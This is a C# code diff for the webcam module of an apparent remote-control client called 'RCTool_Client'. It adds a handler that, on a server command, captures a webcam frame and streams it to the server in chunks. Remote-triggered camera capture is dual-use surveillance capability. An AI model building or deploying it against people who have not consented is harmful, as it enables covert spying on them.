@@ -4,6 +4,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms.VisualStyles;
 using AForge.Video.DirectShow;
 using RCTool_Client.Packet.Inbound;
@@ -33,19 +34,31 @@ namespace RCTool_Client.Webcam
             _scon.PacketHandler = new PacketHandler(_scon);
             _scon.PacketHandler.OnPacketReceivedEvent += PacketHandler_OnPacketReceivedEvent;
             _scon.Connect();
-            _scon.PacketHandler.SendPacket(new OutboundPacket01Identify { ConnectionType = 3 });
+            _scon.PacketHandler.SendPacket(new OutboundPacket01Identify { ConnectionType = 3 , ClientId = UUID});
         }
 
         private void PacketHandler_OnPacketReceivedEvent(ServerConnection scon, Packet.Inbound.InboundPacket packet)
         {
             Console.WriteLine("Webcam packet " + packet.PacketId);
-            if (packet is InboudPacket00RequestData ip0r)
+            if (packet is InboundPacket00RequestData ip0r)
             {
                 switch (ip0r.RequestedDataType)
                 {
                     case 1:
                         SendWebCamList();
                         break;
+                }
+            }
+
+            if (packet is InboundPacket02WebCam ip02wc)
+            {
+                switch (ip02wc.CommandMode)
+                {
+                    case 1:
+                        {
+                            TakeAndSendSnapshotInstant(ip02wc.CamId);
+                            break;
+                        }
                 }
             }
         }
@@ -69,23 +82,48 @@ namespace RCTool_Client.Webcam
             _scon.PacketHandler.SendPacket(packet);
         }
 
+
         public void TakeAndSendSnapshotInstant(string camId)
         {
             VideoCaptureDevice vcd = new VideoCaptureDevice(camId);
+            bool captured = false;
             vcd.NewFrame += (o, e) =>
             {
-                vcd.Stop();
-                OutboundPacket03WebCam packet = new OutboundPacket03WebCam();
-                packet.CommandMode = 1;
+                byte[] imageBytes = null;
 
                 using (var bmp = new Bitmap(e.Frame))
                 using (var ms = new MemoryStream())
                 {
                     bmp.Save(ms, ImageFormat.Jpeg);
-                    packet.ImageBytes = ms.ToArray();
+                    imageBytes = ms.ToArray();
                 }
 
-                _scon.PacketHandler.SendPacket(packet);
+                if (!captured)
+                {
+                    captured = true;
+                    new Thread(() =>
+                    {
+
+                        int parts = (int)Math.Ceiling((double)imageBytes.Length / 4096d);
+                        int cpart = 1;
+                        foreach (var chunk in Util.Slices(imageBytes, 4096))
+                        {
+                            OutboundPacket04ChunkTransfer packet = new OutboundPacket04ChunkTransfer
+                            {
+                                CurrentPart = cpart++,
+                                PartAmount = parts,
+                                BufferSize = chunk.Length,
+                                Buffer = chunk
+                            };
+
+                            _scon.PacketHandler.SendPacket(packet);
+                        }
+
+                        vcd.SignalToStop();
+                        vcd.WaitForStop();
+                    }).Start();
+                }
+
             };
             vcd.Start();
         }
